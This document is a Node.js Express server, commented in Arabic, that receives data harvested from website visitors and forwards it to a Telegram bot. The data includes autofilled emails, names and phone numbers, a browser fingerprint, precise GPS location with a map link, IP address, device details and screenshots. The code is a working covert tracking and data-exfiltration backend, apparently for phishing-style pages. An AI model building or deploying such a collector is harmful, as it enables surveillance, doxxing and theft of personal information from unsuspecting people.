const express = require('express');
const axios = require('axios');
const FormData = require('form-data');
require('dotenv').config();

const app = express();
app.use(express.static('.'));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// ✅ التوكن والـ Chat ID من ملف .env فقط (آمن جداً)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// التحقق من وجود المتغيرات
if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ خطأ: TELEGRAM_BOT_TOKEN أو TELEGRAM_CHAT_ID غير موجود في ملف .env');
    process.exit(1);
}

console.log('✅ تم تحميل متغيرات البيئة بنجاح');

// ================================================================
//  دالة بناء الرسالة
// ================================================================
function buildMessage(data) {
    const d = data;
    const adv = d.advancedData;
    const loc = d.location ? `${d.location.latitude}, ${d.location.longitude} (دقة ${d.location.accuracy}م)` : 'غير متوفر';
    const mapLink = d.location ? `https://www.google.com/maps?q=${d.location.latitude},${d.location.longitude}` : '';

    let message = `🎯 *زائر جديد - بيانات شاملة*\n\n`;
    message += `📧 *البريد الإلكتروني:* ${adv.autofillEmail || 'غير موجود'}\n`;
    message += `📛 *الاسم:* ${adv.autofillName || 'غير موجود'}\n`;
    message += `📱 *رقم الهاتف:* ${adv.autofillTel || 'غير موجود'}\n`;
    message += `🆔 *بصمة المتصفح:* ${adv.fingerprint?.visitorId || 'غير متوفرة'}\n`;
    message += `🔍 *مكونات البصمة:* ${adv.fingerprint?.components || 'غير معروف'}\n\n`;
    message += `🔋 *البطارية:* ${adv.battery?.level || 'غير معروف'}% ${adv.battery?.charging ? '(شحن)' : ''}\n`;
    message += `📡 *الشبكة:* ${adv.connection?.type || 'غير معروف'} (${adv.connection?.downlink || '?'})\n`;
    message += `⚙️ *المعالج:* ${adv.hardware?.cores || 'غير معروف'} نواة\n`;
    message += `🧠 *الذاكرة:* ${adv.hardware?.memory || 'غير معروف'}\n`;
    message += `💻 *نظام التشغيل:* ${adv.os || 'غير معروف'}\n`;
    message += `🖥️ *دقة الشاشة:* ${adv.screen?.width}x${adv.screen?.height} (${adv.screen?.colorDepth} بت)\n`;
    message += `🔌 *الإضافات:* ${adv.plugins || 'لا يوجد'}\n`;
    message += `🚫 *Do Not Track:* ${adv.doNotTrack || 'غير محدد'}\n`;
    message += `🌍 *اللغات:* ${adv.languages || 'غير معروف'}\n\n`;
    message += `⏰ *التوقيت:* ${d.device.localTime}\n`;
    message += `🌐 *الرابط:* ${d.device.url}\n`;
    message += `🔗 *المرجع:* ${d.device.referrer}\n\n`;
    message += `📱 *الجهاز:* ${d.device.deviceType}\n`;
    message += `🌍 *المتصفح:* ${d.device.browser}\n`;
    message += `📶 *محمول:* ${d.device.isMobile ? 'نعم' : 'لا'}\n`;
    message += `🗣 *اللغة:* ${d.device.language}\n`;
    message += `💻 *النظام:* ${d.device.platform}\n`;
    message += `\n🌐 *IP العام:* ${d.ip}\n`;
    message += `📍 *الموقع:* ${loc}\n`;
    if (mapLink) message += `🗺️ [خريطة](${mapLink})\n`;
    message += `\n📐 *الشاشة:* ${d.device.screenSize}\n`;
    message += `⏳ *المنطقة:* ${d.device.timezone}\n`;

    return message;
}

// ================================================================
//  دالة إرسال إلى Telegram مع الصورة
// ================================================================
async function sendPhotoToTelegram(chatId, photoBase64, caption) {
    try {
        // تحويل Base64 إلى Buffer
        const photoBuffer = Buffer.from(photoBase64.split(',')[1], 'base64');
        
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('photo', photoBuffer, 'screenshot.jpg');
        form.append('caption', caption);
        form.append('parse_mode', 'Markdown');
        form.append('disable_web_page_preview', 'true');

        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
            form,
            { headers: form.getHeaders(), timeout: 10000 }
        );

        console.log('✅ تم إرسال الصورة إلى Telegram بنجاح');
        return true;
    } catch (error) {
        console.error('⚠️ فشل إرسال الصورة:', error.message);
        return false;
    }
}

// ================================================================
//  دالة إرسال رسالة نصية إلى Telegram
// ================================================================
async function sendMessageToTelegram(chatId, text) {
    try {
        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: chatId,
                text: text,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            },
            { timeout: 10000 }
        );

        console.log('✅ تم إرسال الرسالة إلى Telegram بنجاح');
        return true;
    } catch (error) {
        console.error('❌ فشل إرسال الرسالة:', error.message);
        return false;
    }
}

// ================================================================
//  API Endpoint الرئيسي
// ================================================================
app.post('/api/send-data', async (req, res) => {
    try {
        const { device, ip, location, advancedData, screenshot } = req.body;

        // بناء البيانات
        const data = {
            device,
            ip,
            location,
            advancedData
        };

        // بناء الرسالة
        const message = buildMessage(data);

        console.log('📨 استقبال البيانات من المستخدم...');
        console.log(`IP: ${ip}`);
        console.log(`الاسم: ${advancedData.autofillName}`);
        console.log(`الهاتف: ${advancedData.autofillTel}`);

        let success = false;

        // محاولة إرسال الصورة أولاً (إن وجدت)
        if (screenshot && screenshot.includes('data:image')) {
            console.log('📸 محاولة إرسال الصورة...');
            success = await sendPhotoToTelegram(TELEGRAM_CHAT_ID, screenshot, message);
        }

        // إرسال الرسالة النصية (دائماً)
        if (!success || !screenshot) {
            console.log('📝 محاولة إرسال الرسالة النصية...');
            success = await sendMessageToTelegram(TELEGRAM_CHAT_ID, message);
        }

        // الرد للعميل
        if (success) {
            res.json({ success: true, message: 'تم الإرسال بنجاح' });
        } else {
            res.status(500).json({ success: false, message: 'فشل الإرسال' });
        }

    } catch (error) {
        console.error('❌ خطأ في معالجة الطلب:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ================================================================
//  مسار اختباري
// ================================================================
app.get('/api/test', (req, res) => {
    res.json({ status: '✅ السيرفر يعمل بنجاح!' });
});

// ================================================================
//  بدء السيرفر
// ================================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 السيرفر يعمل على: http://localhost:${PORT}`);
    console.log(`✅ API Endpoint: http://localhost:${PORT}/api/send-data`);
    console.log(`🧪 اختبر: http://localhost:${PORT}/api/test`);
});
